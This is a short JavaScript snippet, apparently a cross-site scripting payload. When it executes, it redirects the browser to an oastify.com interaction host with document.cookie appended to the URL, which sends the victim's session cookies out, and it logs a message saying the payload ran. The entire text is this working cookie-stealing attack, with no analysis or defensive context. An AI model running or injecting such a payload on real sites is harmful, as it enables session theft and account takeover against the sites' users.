function xssPayload() {
  document.location="https://7rzmd3e3y78k45s1hv3t4a45qwwmkb.oastify.com/" + document.cookie;
}

console.log('XSS payload executed');
xssPayload();
